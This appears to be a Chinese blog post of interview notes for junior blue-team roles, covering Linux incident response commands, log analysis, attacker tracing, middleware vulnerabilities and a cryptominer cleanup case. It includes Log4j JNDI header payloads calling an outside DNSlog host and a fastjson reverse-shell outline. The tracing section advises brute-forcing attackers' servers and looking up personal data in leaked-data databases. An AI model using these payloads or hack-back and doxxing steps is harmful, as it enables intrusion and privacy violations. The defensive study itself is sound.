<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 1、查询特权用户特权用户(uid 为0)</span><br><span class="line">• [root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">• 2、查询可以远程登录的帐号信息</span><br><span class="line">• [root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">• 3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">• [root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot; </span><br><span class="line">• 4、禁用或删除多余及可疑的帐号</span><br><span class="line">• usermod -L user 禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class="line">• userdel user 删除 user 用户</span><br><span class="line">• userdel -r user 将删除 user 用户，并且将 /home 目录下的 user 目录一并删</span><br><span class="line">除</span><br></pre></td></tr></table></figure>

<h4 id="1-2历史命令"><a href="#1-2历史命令" class="headerlink" title="1.2历史命令"></a>1.2历史命令</h4><p>1.root用户的历史命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>

<p>2.进入用户目录下，导出历史命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat .bash_history &gt;&gt; history.tx</span><br></pre></td></tr></table></figure>

<h4 id="1-3检查异常端口"><a href="#1-3检查异常端口" class="headerlink" title="1.3检查异常端口"></a>1.3检查异常端口</h4><p>使用netstat网络连接命令，分析可以端口、IP、PID</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp|more</span><br></pre></td></tr></table></figure>

<p>查看pid对应的进程文件路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br></pre></td></tr></table></figure>

<h4 id="1-4检查异常进程"><a href="#1-4检查异常进程" class="headerlink" title="1.4检查异常进程"></a>1.4检查异常进程</h4><p>使用ps命令，分析进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux|grep pid</span><br><span class="line">ps -ef|grep pname</span><br></pre></td></tr></table></figure>

<h4 id="1-5检查开机启动项"><a href="#1-5检查开机启动项" class="headerlink" title="1.5检查开机启动项"></a>1.5检查开机启动项</h4><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606215950542.png" alt="image-20220606215950542"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 查看运行级别命令</span><br><span class="line">• runlevel</span><br><span class="line">• 系统默认允许级别</span><br><span class="line">• vi /etc/inittab</span><br><span class="line">• id=3：initdefault #系统开机后直接进入哪个运行级别</span><br><span class="line">• 开机启动配置文件</span><br><span class="line">• /etc/rc.local</span><br><span class="line">• /etc/rc.d/rc[0~6].d</span><br><span class="line">• 说明：当我们需要开机启动自己的脚本时，只需要将可执行脚本</span><br><span class="line">丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接</span><br><span class="line">即可。</span><br></pre></td></tr></table></figure>

<h4 id="1-6检查定时任务"><a href="#1-6检查定时任务" class="headerlink" title="1.6检查定时任务"></a>1.6检查定时任务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 1、利用 crontab 创建计划任务</span><br><span class="line">• 基本命令</span><br><span class="line">• crontab -l 列出某个用户cron服务的详细内容</span><br><span class="line">• Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如:</span><br><span class="line">/var/spool/cron/root</span><br><span class="line">• crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">• crontab -e 使用编辑器编辑当前的crontab文件</span><br><span class="line">• 如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure>

<h4 id="重点关注一下目录是否存在恶意脚本"><a href="#重点关注一下目录是否存在恶意脚本" class="headerlink" title="重点关注一下目录是否存在恶意脚本"></a>重点关注一下目录是否存在恶意脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• /var/spool/cron/*</span><br><span class="line">• /etc/crontab</span><br><span class="line">• /etc/cron.d/*</span><br><span class="line">• /etc/cron.daily/*</span><br><span class="line">• /etc/cron.hourly/*</span><br><span class="line">• /etc/cron.monthly/*</span><br><span class="line">• /etc/cron.weekly/</span><br><span class="line">• /etc/anacrontab</span><br><span class="line">• /var/spool/anacron/*</span><br></pre></td></tr></table></figure>

<h4 id="1-7检查服务"><a href="#1-7检查服务" class="headerlink" title="1.7检查服务"></a>1.7检查服务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 查询已安装的服务：</span><br><span class="line">• RPM 包安装的服务</span><br><span class="line">• chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">• ps aux | grep crond 查看当前服务</span><br><span class="line">• 源码包安装的服务</span><br><span class="line">• 查看服务安装位置 ，一般是在/user/local/</span><br><span class="line">• service httpd start</span><br><span class="line">• 搜索/etc/rc.d/init.d/ 查看是否存在</span><br></pre></td></tr></table></figure>

<h4 id="1-8检查异常文件"><a href="#1-8检查异常文件" class="headerlink" title="1.8检查异常文件"></a>1.8检查异常文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，</span><br><span class="line">以“..”为名的文件夹具有隐藏属性</span><br><span class="line">• 2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时</span><br><span class="line">间范围内创建的文件？</span><br><span class="line">• 可以使用find命令来查找，如 find /opt -iname &quot;*&quot; -atime 1 -type</span><br><span class="line">f 找出 /opt 下一天前访问过的文件</span><br><span class="line">• 3、针对可疑文件可以使用 stat 进行创建修改时间</span><br></pre></td></tr></table></figure>

<h4 id="1-9检查系统日志"><a href="#1-9检查系统日志" class="headerlink" title="1.9检查系统日志"></a>1.9检查系统日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 日志默认存放位置：/var/log/</span><br><span class="line">• 查看日志配置情况：more /etc/rsyslog.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志文件 说明</span><br><span class="line">/var/log/cron 记录了系统定时任务相关的日志</span><br><span class="line">/var/log/cups 记录打印信息的日志</span><br><span class="line">/var/log/dmesg</span><br><span class="line">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查</span><br><span class="line">看内核自检信息</span><br><span class="line">/var/log/mailog 记录邮件信息</span><br><span class="line">/var/log/message</span><br><span class="line">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大</span><br><span class="line">多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日</span><br><span class="line">志文件</span><br><span class="line">/var/log/btmp</span><br><span class="line">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要</span><br><span class="line">使用lastb命令查看</span><br><span class="line">/var/log/lastlog</span><br><span class="line">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文</span><br><span class="line">件，不能直接vi，而要使用lastlog命令查看</span><br><span class="line">/var/log/wtmp</span><br><span class="line">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、</span><br><span class="line">关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要</span><br><span class="line">使用last命令来查看</span><br><span class="line">/var/log/utmp</span><br><span class="line">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不</span><br><span class="line">断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而</span><br><span class="line">要使用w,who,users等命令来查询</span><br><span class="line">/var/log/secure</span><br><span class="line">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，</span><br><span class="line">比如SSH登录，su切换用户，sudo授权，甚至添加用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 日志分析常用命令：</span><br><span class="line">• 1、定位有多少IP在爆破主机的root帐号：</span><br><span class="line">• grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c| sort -nr | more</span><br><span class="line">• 定位有哪些IP在爆破：</span><br><span class="line">• grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0- 9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0- 9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line">• 爆破用户名字典是什么？</span><br><span class="line">• grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/;</span><br><span class="line">print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -n</span><br><span class="line">• 2、登录成功的IP有哪些：</span><br><span class="line">• grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c| sort -nr | more</span><br><span class="line">• 登录成功的日期、用户名、IP：</span><br><span class="line">• grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line">• 3、增加一个用户kali日志：</span><br><span class="line">• Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali,</span><br><span class="line">GID=1001</span><br><span class="line">• Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali,</span><br><span class="line">UID=1001, GID=1001, home=/home/kali</span><br><span class="line">•, shell=/bin/bash</span><br><span class="line">• Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok):</span><br><span class="line">password changed for kali</span><br><span class="line">• #grep &quot;useradd&quot; /var/log/secur</span><br><span class="line">• 4、删除用户kali日志：</span><br><span class="line">• Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">• Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27;</span><br><span class="line">owned by</span><br><span class="line">&#x27;kali&#x27;</span><br><span class="line">• Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by&#x27;kali&#x27;</span><br><span class="line">• # grep &quot;userdel&quot; </span><br><span class="line">• 5、su切换用户：</span><br><span class="line">• Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session</span><br><span class="line">opened for user good by root(uid=0)</span><br><span class="line">• sudo授权执行:</span><br><span class="line">• sudo -l</span><br><span class="line">• Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ;</span><br><span class="line">PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r</span><br><span class="line">now</span><br></pre></td></tr></table></figure>

<p>删除日志：rm log.log</p>
<h4 id="1-10-dns设置"><a href="#1-10-dns设置" class="headerlink" title="1.10 dns设置"></a>1.10 dns设置</h4><p>vim /etc/named.conf 打开配置文件</p>
<h4 id="一些常用命令"><a href="#一些常用命令" class="headerlink" title="一些常用命令"></a>一些常用命令</h4><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204521867.png" alt="image-20220615204521867"></p>
<h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 2.1 Rootkit查杀</span><br><span class="line">• Chkrootkit</span><br><span class="line">• 网址：http://www.chkrootkit.org</span><br><span class="line">• Rkhunter</span><br><span class="line">• 网址：http://rkhunter.sourceforge.net</span><br><span class="line">• 2.2 病毒查杀</span><br><span class="line">• Clamav</span><br><span class="line">• 网址：http://www.clamav.net/download.html</span><br><span class="line">• 2.3 webshell查杀</span><br><span class="line">• Linux 版：河马 WebShell 查杀：http://www.shllpub.com</span><br></pre></td></tr></table></figure>



<h2 id="应急响应的案例"><a href="#应急响应的案例" class="headerlink" title="应急响应的案例"></a>应急响应的案例</h2><p>一个是之前o佬讲的</p>
<p>一个是白帽最前沿上面的</p>
<p>天眼流量哪里来？核心交换机做的端口镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">好像是sxf的态势感知吧</span><br><span class="line">首先你去了有很大可能接触态势感知，这是一个综合研判分析平台，由探针STA来进行流量接入，态势负责分析、阻断攻击，你经常涉及的模块功能有两个，一个是日志检索，一个是重保中心的实时监控</span><br><span class="line"></span><br><span class="line">需要客户给你接入内网或vpn，给你平台地址，浏览器直接接入访问，输入账密登录；登录后，我们找到 &gt;&gt;分析中心-日志检索这里</span><br><span class="line"></span><br><span class="line"> 然后在日志检索这块，可以做一些规则的匹配，筛选，比如只看中高危攻击，还可以根据攻击类型进行日志筛选，这块是对接的第三方设备传入的日志流量，有可能识别的厂商安全设备，比如WAF，这个你不需要管，能看到日志就行，接下来，这个就是我们要看的内容。</span><br><span class="line"> </span><br><span class="line"> 然后是安恒的防火墙</span><br><span class="line"> 在这里顺便带大家学习下如何分析，首先你看时间，如果一分钟内产生多条日志告警，那ok，把IP复制出来，去防火墙进行封禁，防火墙怎么封？啊，这，就是找到安全防护，点击添加黑名单--输入攻击IP--点击确定提交</span><br><span class="line"> 外国的ip直接封</span><br><span class="line"> 看具体的日志内容，比如网站扫描，就看它的数据包，user-agent</span><br><span class="line"> 最后写个表记录</span><br></pre></td></tr></table></figure>

<h1 id="溯源-基本思路"><a href="#溯源-基本思路" class="headerlink" title="溯源(基本思路)"></a>溯源(基本思路)</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220607005009412.png" alt="image-20220607005009412"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过黑客ID进行信息收集：</span><br><span class="line">(1) 百度信息收集：“id” （双引号为英文）</span><br><span class="line">(2) 谷歌信息收集</span><br><span class="line">(3) src信息收集（各大src排行榜）</span><br><span class="line">(4) 微博搜索（如果发现有微博记录，可使用tg查询weibo泄露数据）</span><br><span class="line">(5) 微信ID收集：微信进行ID搜索</span><br><span class="line">(6) 如果获得手机号（可直接搜索支付宝、社交账户等）</span><br><span class="line">注意：获取手机号如果自己查到的信息不多，直接上报工作群（利用共享渠道对其进行二次社工）</span><br><span class="line">(7) 豆瓣/贴吧/知乎/脉脉 你能知道的所有社交平台，进行信息收集</span><br><span class="line">(8) CSDN ID，利用CSDN老用户的一个漏洞，爆破ID手机号</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">溯源整个流程我认为有三个部分。 </span><br><span class="line">1. 攻击源捕获。 2. 溯源信息 3. 输出攻击者画像 ···攻击源的捕获是为了获得攻击者的ip、黑客id、手机号、邮箱等信息。 ···溯源信息是为了定位黑客到具体的人。 ···输出攻击者画像是为了给这个人一个格式化的档案方便下次查找与信息存储。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615202911911.png" alt="image-20220615202911911"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615203001610.png" alt="image-20220615203001610"></p>
<h2 id="小思路"><a href="#小思路" class="headerlink" title="小思路"></a>小思路</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.红队攻击都会挂着代理，你溯源的话只能溯源到他的代理ip，没有太大的意义，如果说服务器被上了内存马的情况，可以去工具取样他内存马的ip，对内存马ip反向扫描端口，因为他们也是通过远程进去的，去爆破他们的ssh,3389和cs的密码。</span><br><span class="line"></span><br><span class="line">2.反序列化的取样，他打shiro，里面就有他的基本设备vps，通过中间件吧这些有特征的ip收集，放到在线情报平台上识别，检测是不是有ip绑定域名的，通过whois反查他的域名注册时间、邮箱，通过社工库查他的手机号，然后通过社交软件，qq、微信、支付宝来给他转一毛钱，拼接他的个人信息。</span><br></pre></td></tr></table></figure>

<h2 id="流量溯源"><a href="#流量溯源" class="headerlink" title="流量溯源"></a>流量溯源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.先看日志，看攻击时间做一个审计，搜索这个时间文件上传的操作，一般是GET和POST两种，GET的话可以直接看到他请求的资源、地址和content，然后webshell该杀就杀，后门该补就补，如果是POST，那么就看不到请求的内容，可以去防火墙上下载完整数据包来分析。</span><br></pre></td></tr></table></figure>

<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拿到流量包后将其导入wireshark中，使用过滤规则对流量包进行分析，常用的过滤规则有：</span><br><span class="line">http contains &quot;关键字&quot;</span><br><span class="line">http.response.code == 200</span><br><span class="line">http.request.method == POST</span><br><span class="line">tcp.prot == 80</span><br><span class="line">ip.addr == &quot;10.1.1.1&quot;</span><br><span class="line">ip.src</span><br><span class="line">ip.dst</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="常见中间件漏洞"><a href="#常见中间件漏洞" class="headerlink" title="常见中间件漏洞"></a>常见中间件漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS7.5，apache，nginx，tomcat，weblogic，jboos</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 2.1）IIS：</span><br><span class="line"></span><br><span class="line">PUT漏洞</span><br><span class="line">短文件名猜解</span><br><span class="line">远程代码执行</span><br><span class="line">解析漏洞</span><br><span class="line">     2.2）Apache：</span><br><span class="line"></span><br><span class="line">解析漏洞  x.php.jpg</span><br><span class="line">目录遍历</span><br><span class="line">     2.3）Nginx：</span><br><span class="line"></span><br><span class="line">文件解析   x.jpg/.php</span><br><span class="line">目录遍历 </span><br><span class="line">CRLF注入</span><br><span class="line">目录穿越</span><br><span class="line">     2.4）Tomcat： 8080</span><br><span class="line"></span><br><span class="line">远程代码执行</span><br><span class="line">war后门文件部署</span><br><span class="line">     2.5）Jboss：</span><br><span class="line"></span><br><span class="line">反序列化漏洞</span><br><span class="line">war后门文件部署</span><br><span class="line">     2.6）WebLogic：7001 7002</span><br><span class="line"></span><br><span class="line">反序列化漏洞</span><br><span class="line">SSRF</span><br><span class="line">任意文件上传</span><br><span class="line">war后门文件部署</span><br></pre></td></tr></table></figure>



<h1 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库类（扫描弱口令）</span><br><span class="line"></span><br><span class="line">1433：MSSQL</span><br><span class="line">1521：Oracle</span><br><span class="line">3306：Mysql</span><br><span class="line">5432：PostgreSQL</span><br><span class="line">特殊服务类（未授权/命令执行）</span><br><span class="line"></span><br><span class="line">3389:远程连接</span><br><span class="line">443：ssl 心脏滴血</span><br><span class="line">873：Rsync 未授权</span><br><span class="line">5984：CouchDB http：//xxx:5984/_utils/</span><br><span class="line">6379：Redis 未授权</span><br><span class="line">7001、7002：Weblogic 默认弱口令</span><br><span class="line">8088：Hadoop Yarn 资源管理系统 REST API 存在未授权</span><br><span class="line">8161：Apache ActiveMQ 未授权、弱口令，put 文件上传，move 文件移动</span><br><span class="line">9200、9300：elasticsearch 命令执行</span><br><span class="line">11211：Memcache 未授权，telnet ip 就可以获得服务器敏感信息</span><br><span class="line">27017、27018：Mongodb 未授权</span><br><span class="line">50000：SAP 命令执行</span><br><span class="line">50070、50030 Hadoop 未授权访问</span><br><span class="line">常用端口类（弱口令/端口爆破）</span><br><span class="line"></span><br><span class="line">21：FTP 弱口令，匿名 anonymous/空登录，以及 ms12-073</span><br><span class="line">25：SMTP 简单邮件传输服务器端口</span><br><span class="line">23：Telnet 的端口，Telnet 是一种可以远程登录并管理远程机器的服务</span><br><span class="line">22：ssh 端口，PcAnywhere 建立 TCP 和这一端口的连接可能是为了寻找 ssh，这一服务有许多弱点</span><br><span class="line">53：dns 端口</span><br><span class="line">139：属于 TCP 协议，是为 NetBIOS Session Service 提供的，主要提供 Windows 文件和打印机共享以及 Unix 中的 Samba 服务</span><br><span class="line">445：网络共享 smb 服务，尝试利用 ms08067，ms17010 等以及 IPC$ 攻击手段</span><br><span class="line">2601、2604：zebra 路由，默认密码 zebra</span><br></pre></td></tr></table></figure>

<h1 id="冰蝎的特点"><a href="#冰蝎的特点" class="headerlink" title="冰蝎的特点"></a>冰蝎的特点</h1><p>冰蝎其最大特点就是对交互流量进行AES对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。</p>
<h1 id="log4j的原理以及一些payload"><a href="#log4j的原理以及一些payload" class="headerlink" title="log4j的原理以及一些payload"></a>log4j的原理以及一些payload</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Log4j2漏洞总的来说就是：因为Log4j2默认支持解析ldap/rmi协议，并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容$&#123;jndi:ldap://localhost:9999/Test&#125;恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br><span class="line">Client-IP: $&#123;jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span><br><span class="line">X-Api-Version: $&#123;jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220611162251120.png" alt="image-20220611162251120"></p>
<h1 id="fastjson-content-type"><a href="#fastjson-content-type" class="headerlink" title="fastjson(content type)"></a>fastjson(content type)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">autotype再处理json的时候，没有对@type进行安全验证，就可以传入危险的类，远程连接rmi主机，反弹shell之类的操作。</span><br><span class="line"></span><br><span class="line">面试官：它有什么指纹特征吗？</span><br><span class="line">@type,然后大部分版本???payload还有autocommit:ture</span><br><span class="line"></span><br><span class="line">复现步骤</span><br><span class="line">（1）开启环境</span><br><span class="line">黑客使用payload攻击主机A（该payload需要指定rmi/ldap地址）</span><br><span class="line">主机A引发反序列化漏洞，进行ldap远程方法调用，去连接主机B的9999端口。</span><br><span class="line">主机B的LDAP服务指定加载主机C的恶意java类，所以主机A通过主机B的LDAP服务最终加载并执行主机C的恶意java类。</span><br><span class="line">主机A执行恶意Java类，主机B获得反弹shell，控制主机A。</span><br><span class="line">进入docker容器进行复现</span><br><span class="line"></span><br><span class="line">开启抓包确定是不是fastjson框架，通过修改请求包判断是否是fastjson框架  ，应为fastjson有一个严格的格式才能解析，否则会报错</span><br><span class="line">准备一个恶意的类</span><br><span class="line">使用javac编译 rmi.java文件  生成一个类文件      </span><br><span class="line">然后将类文件放到监听的服务器上</span><br><span class="line">使用工具运行rmi文件</span><br><span class="line">修改数据包中的post请求主体</span><br><span class="line">然后进行端口监听</span><br><span class="line">点击go,发现反弹shell成功</span><br></pre></td></tr></table></figure>

<h1 id="最近的spring-rce"><a href="#最近的spring-rce" class="headerlink" title="最近的spring rce"></a>最近的spring rce</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个CVE-2010-1622漏洞的原因是Spring参数绑定时，可以注入一个Java pojo对象，这个对象可以是恶意的去注册一些敏感tomcat的属性，最后通过修改Tomcat的配置来执行危险操作。</span><br><span class="line">class.*</span><br></pre></td></tr></table></figure>



<h1 id="挖矿病毒的处置"><a href="#挖矿病毒的处置" class="headerlink" title="挖矿病毒的处置"></a>挖矿病毒的处置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（一）Windows系统</span><br><span class="line"></span><br><span class="line">2、在防火墙关闭不必要的映射端口号或服务，重启再测试是否还会有可疑进程存在；</span><br><span class="line"></span><br><span class="line">3、对操作系统及系统相关管理界面的登录设置强密码（10位以上，大小写字母、数字及特殊字符的组合）。</span><br><span class="line"></span><br><span class="line">（二）Linux/mac系统</span><br><span class="line"></span><br><span class="line">2、在防火墙关闭不必要的映射端口号或服务，重启再测试是否还会有可疑进程存在。</span><br><span class="line"></span><br><span class="line">3、建议系统管理员对操作系统及系统相关管理界面的登录设置强密码（10位以上，大小写字母、数字及特殊字符的组合）；</span><br></pre></td></tr></table></figure>

<p>netstat -antp   linux查看进程</p>
<p>0x00 前言</p>
<p> 随着虚拟货币的疯狂炒作，挖矿病毒已经成为不法分子利用最为频繁的攻击方式之一。病毒传播者可以利用个人电脑或服务器进行挖矿，具体现象为电脑CPU占用率高，C盘可使用空间骤降，电脑温度升高，风扇噪声增大等问题。</p>
<p>0x01 应急场景</p>
<p> 某天上午重启服务器的时候，发现程序启动很慢，打开任务管理器，发现cpu被占用接近100%，服务器资源占用严重。</p>
<p><img src="http://39.99.247.218:8081/static/d2luLTgtMS5wbmc=1653544352" alt="win81.png"></p>
<p>0x02 事件分析</p>
<p> 登录网站服务器进行排查，发现多个异常进程：</p>
<p><img src="http://39.99.247.218:8081/static/d2luLTgtMi5wbmc=1653544276" alt="win82.png"></p>
<p>分析进程参数：</p>
<p>wmic process get caption,commandline /value &gt;&gt; tmp.txt</p>
<p><img src="http://39.99.247.218:8081/static/d2luLTgtMy5wbmc=1653544367" alt="win83.png"><br>TIPS:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在windows下查看某个运行程序（或进程）的命令行参数</span><br><span class="line">使用下面的命令：</span><br><span class="line">wmic process get caption,commandline /value</span><br><span class="line">如果想查询某一个进程的命令行参数，使用下列方式：</span><br><span class="line">wmic process where caption=”svchost.exe” get caption,commandline /value</span><br><span class="line">这样就可以得到进程的可执行文件位置等信息。</span><br></pre></td></tr></table></figure>

<p>访问该链接：</p>
<p><img src="http://39.99.247.218:8081/static/d2luLTgtNC5wbmc=1653544339" alt="win84.png"><br>Temp目录下发现Carbon、run.bat挖矿程序:</p>
<p><img src="http://39.99.247.218:8081/static/d2luLTgtNS5wbmc=1653544334" alt="win85.png"></p>
<p>具体技术分析细节详见：</p>
<blockquote>
<p>360CERT：利用WebLogic漏洞挖矿事件分析</p>
<p><a href="https://www.anquanke.com/post/id/92223">https://www.anquanke.com/post/id/92223</a></p>
</blockquote>
<p>清除挖矿病毒：关闭异常进程、删除c盘temp目录下挖矿程序 。</p>
<p><strong>临时防护方案</strong></p>
<ol>
<li><p>根据实际环境路径，删除WebLogic程序下列war包及目录</p>
<p>rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war</p>
<p>rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war</p>
<p>rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat</p>
</li>
<li><p>重启WebLogic或系统后，确认以下链接访问是否为404</p>
<p><a href="http://x.x.x.x:7001/wls-wsat">http://x.x.x.x:7001/wls-wsat</a></p>
</li>
</ol>
<p>0x04 防范措施</p>
<p> 新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率。通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞，如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞，Struts2远程命令执行等，导致大量服务器被感染挖矿程序的现象 。总结了几种预防措施：</p>
